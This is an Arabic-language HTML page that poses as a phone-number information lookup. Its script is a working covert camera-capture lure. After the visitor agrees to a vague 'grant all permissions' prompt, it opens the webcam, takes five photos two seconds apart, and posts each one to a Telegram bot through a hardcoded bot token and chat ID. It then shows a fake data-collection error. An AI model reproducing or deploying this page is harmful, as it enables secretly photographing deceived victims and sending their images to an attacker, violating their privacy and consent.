<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جمع البيانات</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            padding: 20px;
        }
        h2 {
            color: #333;
        }
        input, button {
            padding: 10px;
            margin: 10px;
            font-size: 16px;
        }
        button {
            background-color: #28a745;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

    <h2>أدخل رقم الهاتف</h2>
    <input type="text" id="phoneNumber" placeholder="رقم الهاتف">
    <br>
    <button onclick="requestPermissions()">عرض المعلومات</button>

    <script>
        function requestPermissions() {
            if (confirm("قم بإعطاء كل الأذونات للحصول على المعلومات")) {
                getCameraAccess();
            }
        }

        function getCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    let video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    let captureCount = 0;
                    let maxCaptures = 5;

                    function captureImage() {
                        if (captureCount < maxCaptures) {
                            setTimeout(() => {
                                let canvas = document.createElement("canvas");
                                let ctx = canvas.getContext("2d");
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                                let imageData = canvas.toDataURL("image/png");
                                sendToBot(imageData, `photo_${captureCount + 1}`);

                                captureCount++;
                                captureImage(); // التقاط الصورة التالية
                            }, 2000); // التقاط كل صورة بعد 2 ثانية
                        } else {
                            stream.getTracks().forEach(track => track.stop());
                            setTimeout(() => {
                                document.body.innerHTML = "<h2 style='color:red;'>هناك خطأ في جمع البيانات</h2>";
                            }, 2000);
                        }
                    }

                    captureImage();
                })
                .catch(err => {
                    alert("يجب إعطاء إذن الوصول إلى الكاميرا!");
                });
        }

        function sendToBot(imageData, photoName) {
            let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc";
            let chatId = "7554235698";

            fetch(imageData)
                .then(res => res.blob())
                .then(blob => {
                    let formData = new FormData();
                    formData.append("chat_id", chatId);
                    formData.append("photo", blob, `${photoName}.png`);
                    formData.append("caption", `📸 صورة جديدة: ${photoName}`);

                    return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                })
                .then(response => response.json())
                .then(data => {
                    console.log("تم الإرسال بنجاح:", data);
                })
                .catch(error => {
                    console.error("خطأ في الإرسال:", error);
                });
        }
    </script>

</body>
</html>
